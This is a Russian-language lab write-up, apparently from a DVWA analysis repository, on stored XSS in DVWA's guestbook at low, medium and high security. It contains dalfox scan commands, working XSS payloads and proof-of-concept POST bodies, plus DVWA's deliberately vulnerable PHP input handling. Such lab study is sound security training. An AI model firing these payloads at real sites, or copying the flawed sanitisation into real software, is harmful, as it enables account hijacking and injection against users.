#### Рекомендую сначала прочитать [XSS (Rreflected)](https://github.com/obsca/DVWA-analysis/blob/main/XSS%20(Rreflected).md)

Тут становится уже интереснее, во первых используется POST запрос, во вторых данные уже передаются не в URL запросе, а как параметры в HTTP. 
### LOW
Посмотрим название параметров которые мы передаетм в DevTools. Во вкладке Network выберем запрос, который отправляется при передаче параметров:
<img width="1466" height="687" alt="Pasted image 20260225224117" src="https://github.com/user-attachments/assets/5685c20e-5a93-47c1-af82-eb37e0e98ee6" />

Крафтим вот такой запрос с такими параметрами:
```sh
└─$ dalfox url "http://127.0.0.1:42001/vulnerabilities/xss_s/" \
--method POST \
--data "txtName=test&mtxMessage=test&btnSign=Sign+Guestbook" \
--cookie "PHPSESSID=48bd535863ab49a9e2f91bd12add6b03; security=low"
```

```sh
[V] Triggered XSS Payload (found DOM Object): mtxMessage="><IMG SRC=x ontimeupdate="alert(String.fromCharCode(88,83,83))" class=dalfox>
    284 line:  t<br />Message: test"><IMG SRC=x ontimeupdate="alert(String.fromCharCode(88,83,8                                                                           
[POC][V][POST][inHTML-FORM] http://127.0.0.1:42001/vulnerabilities/xss_s/ -d btnSign=Sign+Guestbook&mtxMessage=test%22%3E%3CIMG+SRC%3Dx+ontimeupdate%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E&txtName=test                   
[V] Triggered XSS Payload (found DOM Object): txtName=><input onfocus=alert(1) autofo ⠙  [902/2025 Queries][44.54%] Passing "btnSign" param queries and waiting headless20[*] --------------------------------------------------------------------------------
[*] [duration: 8.644478254s][issues: 3] Finish Scan!
```

И тоже спокойно получаем готовый PoC
<img width="224" height="309" alt="Pasted image 20260225224851" src="https://github.com/user-attachments/assets/af718df2-d76c-46a7-851a-088ccf4fd3c3" />

После проведения Хранимой XSS, во вкладке Setup/Reset DB обновим БД что бы убрать наши XSS payload-ы

#### Уязвимый код
```php
if( isset( $_POST[ 'btnSign' ] ) ) {
	// Get input
	$message = trim( $_POST[ 'mtxMessage' ] );
	$name    = trim( $_POST[ 'txtName' ] );

	// Sanitize message input
	$message = stripslashes( $message );
	$message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Sanitize name input
	$name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Update database
	$query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	//mysql_close();
}

?>
```
Здесь инересный момент. Есть защита от SQLi, но от XSS нет. Ввод сохраняется в БД без экранирования. 

### MEDIUM

```sh
└─$ dalfox url "http://127.0.0.1:42001/vulnerabilities/xss_s/" \
--method POST \
--data "txtName=test&mtxMessage=test&btnSign=Sign+Guestbook" \
--cookie "PHPSESSID=48bd535863ab49a9e2f91bd12add6b03; security=medium"
```

```sh
[*] Starting scan [SID:Single] / URL: http://127.0.0.1:42001/vulnerabilities/xss_s/
[I] Found 34 testing points in DOM-based parameter mining
[I] Content-Type is text/html;charset=utf-8
[W] Reflected Payload in HTML: txtName='><keygen onfocus=alert(1) autofocus>
    284 line:  comments">Name: test'><keygen onfocus=alert(1) autofocus><br />Message: test<br                                                                            
[POC][R][POST][inHTML-FORM] http://127.0.0.1:42001/vulnerabilities/xss_s/ -d btnSign=Sign+Guestbook&mtxMessage=test&txtName=test%27%3E%3Ckeygen+onfocus%3Dalert%281%29+autofocus%3E                                                                            
[V] Triggered XSS Payload (found DOM Object): txtName="><IMG SRC=x onbeforeunload="alert(String.fromCharCode(88,83,83))" class=dalfox>
    288 line:  comments">Name: test"><IMG SRC=x onbeforeunload="alert(String.fromCharCode(88,83                                                                           
 ⠴  [1007/2025 Queries][49.73%] Passing "txtName" param queries and waiting headless2[*] --------------------------------------------------------------------------------
[*] [duration: 8.67747442s][issues: 4] Finish Scan!
```

Легчайше!

#### Уязвимый код
```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
	// Get input
	$message = trim( $_POST[ 'mtxMessage' ] );
	$name    = trim( $_POST[ 'txtName' ] );

	// Sanitize message input
	$message = strip_tags( addslashes( $message ) );
	$message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$message = htmlspecialchars( $message );

	// Sanitize name input
	$name = str_replace( '<script>', '', $name );
	$name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Update database
	$query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	//mysql_close();
}

?>
```

Здесь аналогично с medium Отраженной XSS, все тоже самое только есть фильтрация тега `<script>`.
### HARD

```sh
└─$ dalfox url "http://127.0.0.1:42001/vulnerabilities/xss_s/" \
--method POST \
--data "txtName=test&mtxMessage=test&btnSign=Sign+Guestbook" \
--cookie "PHPSESSID=48bd535863ab49a9e2f91bd12add6b03; security=high"
```

```sh
[*] Starting scan [SID:Single] / URL: http://127.0.0.1:42001/vulnerabilities/xss_s/
[I] Found 34 testing points in DOM-based parameter mining
[I] Content-Type is text/html;charset=utf-8
[V] Triggered XSS Payload (found DOM Object): txtName="><IMG SRC=x oninvalid="alert(String.fromCharCode(88,83,83))" class=dalfox>
    280 line:  comments">Name: test"><IMG SRC=x oninvalid="alert(String.fromCharCode(88,83,83))                                                                           
[POC][V][POST][inHTML-FORM] http://127.0.0.1:42001/vulnerabilities/xss_s/ -d btnSign=Sign+Guestbook&mtxMessage=test&txtName=test%22%3E%3CIMG+SRC%3Dx+oninvalid%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E                      
[V] Triggered XSS Payload (found DOM Object): mtxMessage=">asd
[POC][V][POST][inHTML-FORM] http://127.0.0.1:42001/vulnerabilities/xss_s/ -d btnSign=Sign+Guestbook&mtxMessage=test%22%3Easd&txtName=test                                 
 ⠴  [634/2025 Queries][31.31%] Passing "btnSign" param queries and waiting headless20[*] --------------------------------------------------------------------------------
[*] [duration: 8.781757421s][issues: 3] Finish Scan!
```

Тут все тоже самое, даже грустно как-то. **dalfox** делает всю работу за нас.
